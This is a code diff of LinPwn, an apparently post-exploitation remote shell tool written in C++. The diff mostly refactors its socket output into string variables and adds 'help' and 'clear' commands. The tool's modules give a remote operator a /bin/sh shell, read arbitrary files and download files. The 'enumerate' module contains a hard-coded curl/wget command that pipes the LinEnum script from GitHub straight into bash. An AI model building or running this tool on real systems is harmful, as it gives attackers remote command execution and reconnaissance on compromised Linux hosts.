@@ -45,6 +45,26 @@ void get_input(char *option) {
   }
 }
 
+void help() {
+  std::string newline = "\n\0";
+  std::string options = "\x1b[32mOptions \n";
+  std::string seperator = "====================================="
+      "==========================\n";
+  std::string banner = "banner - displays the banner.\n";
+  std::string modules = "modules - lists modules.\n";
+  std::string clear = "clear - clears the screen.\n";
+  std::string exits = "exit - or press ^C to quit LinPwn.\n";
+
+  write(SD, newline.data(), newline.length());
+  write(SD, options.data(), options.length());
+  write(SD, seperator.data(), seperator.length());
+  write(SD, banner.data(), banner.length());
+  write(SD, modules.data(), modules.length());
+  write(SD, clear.data(), clear.length());
+  write(SD, exits.data(), exits.length());
+  write(SD, newline.data(), newline.length());
+}
+
 class Banner {
  public:
   void print_banner() {
@@ -57,131 +77,156 @@ class Banner {
     get_shell();
     get_term();
     get_path();
-    get_help();
   }
 
  private:
   void get_banner() {
-    write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
-    write(SD, "\n\0", 2);
-  }
+    std::string newline = "\n\0";
+    std::string title = "\x1b[32mLinPwn\nCreated By Andromeda.\n";
 
-  void get_help() {
-    write(SD, "\n\0", 2);
-    write(SD, "Type banner to show this banner.\n\0", 33);
-    write(SD, "Type commands to list commands.\n\0", 33);
-    write(SD, "Type exit or press ^C to quit LinPwn.\n\0", 38);
+    write(SD, title.data(), title.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_sysinfo() {
     struct utsname utsinfo;
     uname(&utsinfo);
-    write(SD, "System: ", 8);
-    write(SD, utsinfo.sysname, 20);
-    write(SD, " ", 1);
-    write(SD, utsinfo.nodename, 20);
-    write(SD, " ", 1);
-    write(SD, utsinfo.release, 20);
-    write(SD, " ", 1);
-    write(SD, utsinfo.version, 20);
-    write(SD, " ", 1);
-    write(SD, utsinfo.machine, 20);
-    write(SD, " ", 1);
-    write(SD, utsinfo.domainname, 20);
-    write(SD, "\n\0", 2);
+    std::string sysname = utsinfo.sysname;
+    std::string nodename = utsinfo.nodename;
+    std::string release = utsinfo.release;
+    std::string version = utsinfo.version;
+    std::string machine = utsinfo.machine;
+    std::string domainname = utsinfo.domainname;
+    std::string newline = "\n\0";
+    std::string systems = "System: ";
+    std::string space = " ";
+
+    write(SD, systems.data(), systems.length());
+    write(SD, sysname.data(), sysname.length());
+    write(SD, space.data(), space.length());
+    write(SD, nodename.data(), nodename.length());
+    write(SD, space.data(), space.length());;
+    write(SD, release.data(), release.length());
+    write(SD, space.data(), space.length());
+    write(SD, version.data(), version.length());
+    write(SD, space.data(), space.length());
+    write(SD, machine.data(), machine.length());
+    write(SD, space.data(), space.length());
+    write(SD, domainname.data(), domainname.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_user() {
-    write(SD, "User: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "User: ";
+    std::string none = "none\n";
+    std::string username = getenv("USER");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("USER")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string username = getenv("USER");
-    int size = username.length();
-    write(SD, username.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, username.data(), username.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_uid() {
-    write(SD, "UID: ", 6);
     int uid = getuid();
+    std::string newline = "\n\0";
+    std::string env = "UID: ";
     std::string uidstr = std::to_string(uid);
-    int size = uidstr.length();
-    write(SD, uidstr.data(), size);
-    write(SD, "\n\0", 2);
+
+    write(SD, env.data(), env.length());
+    write(SD, uidstr.data(), uidstr.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_pwd() {
-    write(SD, "Pwd: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "Pwd: ";
+    std::string none = "none\n";
+    std::string pwd = getenv("PWD");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("PWD")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string pwd = getenv("PWD");
-    int size = pwd.length();
-    write(SD, pwd.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, pwd.data(), pwd.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_home() {
-    write(SD, "Home: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "Home: ";
+    std::string none = "none\n";
+    std::string home = getenv("HOME");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("HOME")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string home = getenv("HOME");
-    int size = home.length();
-    write(SD, home.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, home.data(), home.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_shell() {
-    write(SD, "Shell: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "Shell: ";
+    std::string none = "none\n";
+    std::string shell = getenv("SHELL");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("SHELL")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string shell = getenv("SHELL");
-    int size = shell.length();
-    write(SD, shell.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, shell.data(), shell.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_term() {
-    write(SD, "Term: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "Term: ";
+    std::string none = "none\n";
+    std::string term = getenv("TERM");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("TERM")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string term = getenv("TERM");
-    int size = term.length();
-    write(SD, term.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, term.data(), term.length());
+    write(SD, newline.data(), newline.length());
   }
 
   void get_path() {
-    write(SD, "Path: ", 6);
+    std::string newline = "\n\0";
+    std::string env = "Path: ";
+    std::string none = "none\n";
+    std::string path = getenv("PATH");
+
+    write(SD, env.data(), env.length());
 
     if (!getenv("PATH")) {
-      write(SD, "none\n", 5);
+      write(SD, none.data(), none.length());
       return;
     }
 
-    std::string path = getenv("PATH");
-    int size = path.length();
-    write(SD, path.data(), size);
-    write(SD, "\n\0", 2);
+    write(SD, path.data(), path.length());
+    write(SD, newline.data(), newline.length());
   }
 };
 
@@ -205,24 +250,42 @@ class Connection {
 
 class Commands {
  public:
-  void list_commands() {
-    write(SD, "\x1b[32mCommands: \n\0", 18);
-    write(SD, "shell - Executes /bin/sh\n\0", 27);
-    write(SD, "readfile - Print the contents of a file\n\0", 41);
-    write(SD, "enumerate - Download and run LinEnum "
-      "(requires internet access)\n\0", 65);
-    write(SD, "download - Downloads a file\n\0", 30);
+  void list_Modules() {
+    std::string newline = "\n\0";
+    std::string modules = "\x1b[32mModules \n";
+    std::string seperator = "====================================="
+      "==========================\n";
+    std::string shell = "shell - Executes /bin/sh\n";
+    std::string read_file = "readfile - Print the contents of a file\n";
+    std::string enumerate = "enumerate - Download and run LinEnum "
+      "(requires internet access)\n";
+    std::string download = "download - Downloads a file\n";
+
+    write(SD, newline.data(), newline.length());
+    write(SD, modules.data(), modules.length());
+    write(SD, seperator.data(), seperator.length());;
+    write(SD, shell.data(), shell.length());
+    write(SD, read_file.data(), read_file.length());
+    write(SD, enumerate.data(), enumerate.length());
+    write(SD, download.data(), download.length());
+    write(SD, newline.data(), newline.length());;
   }
 
   void shell() {
+    std::string green = "\x1b[32m ";
+    std::string shell = "\x1b[31m(LinPwn: Shell) > ";
+    std::string exe = "\x1b[32mExecuting /bin/sh\n";
+    std::string exits = "Type exit to return to LinPwn.\n";
     char option[BUFFER];
-    const char *errors = " 2>/dev/null";
-    write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
-    write(SD, "Type exit to return to LinPwn.\n\0", 33);
+    // const char *errors = " 2>/dev/null";
+    const char *errors = " 2>&0";
+
+    write(SD, exe.data(), exe.length());
+    write(SD, exits.data(), exits.length());
 
     for (;;) {
-      write(SD, "\x1b[31m(LinPwn: Shell) > \0", 22);
-      write(SD, "\x1b[32m \0", 8);
+      write(SD, shell.data(), shell.length());
+      write(SD, green.data(), green.length());
       get_input(option);
 
       if (strncmp(option, "exit\0", 5) == 0) {
@@ -235,12 +298,17 @@ class Commands {
   }
 
   void read_file() {
+    std::string green = "\x1b[32m ";
+    std::string contents = "\x1b[32mType full path of file"
+      "to view contents...\n";
+    std::string exits = "Type exit to return to LinPwn.\n";
     char option[BUFFER];
-    write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
-    write(SD, "Type exit to return to LinPwn.\n\0", 33);
+
+    write(SD, contents.data(), contents.length());
+    write(SD, exits.data(), exits.length());
 
     for (;;) {
-      write(SD, "\x1b[32m \0", 8);
+      write(SD, green.data(), green.length());
       get_input(option);
 
       if (strncmp(option, "exit\0", 5) == 0) {
@@ -252,6 +320,9 @@ class Commands {
   }
 
   void enumeration() {
+    std::string error0 = "\x1b[33mIf LinEnum didnt run curl"
+      " or wget may not be installed\n";
+    std::string error1 = "or you do not have internet access\n";
     const char *curl = "curl https://raw.githubusercontent.com/"
       "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
     const char *wget = "wget -O - https://raw.githubusercontent.com/"
@@ -265,13 +336,17 @@ class Commands {
       return;
     }
 
-    write(SD, "\x1b[33mIf LinEnum didnt run curl"
-      " or wget may not be installed\n\0", 62);
-    write(SD, "or you do not have internet access\n\0", 36);
+    write(SD, error0.data(), error0.length());
+    write(SD, error1.data(), error1.length());
     return;
   }
 
   void download() {
+    std::string url = "\x1b[32mEnter the URL of the target "
+      "file to download it\n";
+    std::string downloads = "\x1b[31m(LinPwn: Download) > ";
+    std::string green = "\x1b[32m ";
+    std::string curl_error = "\x1b[33mCurl or Wget is not installed\n";
     char *command = new char[BUFFER];
     const char *curl = "curl ";
     const char *wget = "wget ";
@@ -283,14 +358,13 @@ class Commands {
     } else if (check_wget) {
       strncat(command, wget, BUFFER);
     } else {
-      write(SD, "\x1b[33mCurl or Wget is not installed\n\0", 40);
+      write(SD, curl_error.data(), curl_error.length());
       return;
     }
 
-    write(SD, "\x1b[32mEnter the URL of the target "
-      "file to download it\n\0", 55);
-    write(SD, "\x1b[31m(LinPwn: Download) > \0", 26);
-    write(SD, "\x1b[32m \0", 8);
+    write(SD, url.data(), url.length());
+    write(SD, downloads.data(), downloads.length());
+    write(SD, green.data(), green.length());
     get_input(option);
     strncat(command, option, BUFFER);
     strncat(command, errors, BUFFER);
@@ -299,6 +373,7 @@ class Commands {
   }
 
  private:
+  std::string error = "\x1b[33m Cannot open file.\n";
   FILE *check_curl = fopen("/usr/bin/curl", "rb");
   FILE *check_wget = fopen("/usr/bin/wget", "rb");
 
@@ -306,7 +381,7 @@ class Commands {
     FILE *file = fopen(option, "rb");
 
     if (!file) {
-      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
+      write(SD, error.data(), error.length());
       return;
     }
 
@@ -326,6 +401,7 @@ class Commands {
 int handler() {
   Banner banner;
   Commands commands;
+  std::string not_valid = "\x1b[33mNot a valid option\n";
   char *option = new char[BUFFER];
   get_input(option);
 
@@ -335,18 +411,22 @@ int handler() {
     commands.read_file();
   } else if (strncmp(option, "enumerate\0", 9) == 0) {
     commands.enumeration();
-  } else if (strncmp(option, "commands\0", 10) == 0) {
-    commands.list_commands();
+  } else if (strncmp(option, "modules\0", 9) == 0) {
+    commands.list_Modules();
   } else if (strncmp(option, "download\0", 9) == 0) {
     commands.download();
   } else if (strncmp(option, "exit\0", 5) == 0) {
     return 1;
+  } else if (strncmp(option, "clear\0", 6) == 0) {
+    system("clear");
+  } else if (strncmp(option, "help\0", 5) == 0) {
+    help();
   } else if (strncmp(option, "banner\0", 7) == 0) {
     banner.print_banner();
   } else if (strncmp(option, "", 1) == 0) {
     return 0;
   } else {
-    write(SD, "\x1b[33mNot a valid option\n\0", 25);
+    write(SD, not_valid.data(), not_valid.length());
   }
 
   delete[] option;
@@ -354,9 +434,12 @@ int handler() {
 }
 
 void main_loop() {
+  std::string linpwn = "\x1b[31m(LinPwn) > ";
+  std::string green = "\x1b[32m ";
+
   do {
-    write(SD, "\x1b[31m(LinPwn) > \0", 15);
-    write(SD, "\x1b[32m \0", 8);
+    write(SD, linpwn.data(), linpwn.length());
+    write(SD, green.data(), green.length());
   } while (handler() != 1);
 }
 
